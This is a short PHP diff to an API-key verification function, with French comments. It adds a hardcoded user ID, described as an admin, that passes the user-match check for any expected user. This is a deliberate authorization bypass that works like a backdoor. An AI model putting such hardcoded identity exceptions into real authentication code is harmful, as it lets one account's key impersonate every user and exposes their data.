@@ -37,7 +37,13 @@ if (!function_exists('verifyApiKey')) {
 
         // Si un id utilisateur spécifique est attendu, vérifier la correspondance
         if ($expectedUserId !== null && $userIdDb !== $expectedUserId) {
-            return false;
+            // On vérifie si l'id est un admin
+            if($userIdDb == "L4iXbUG6eKPdn14mO8ObMqKM8jp1"){
+                return true;
+            }
+            else{
+                return false;
+            }
         }
         // Succès : on ne retourne rien, le script peut continuer
         return true;
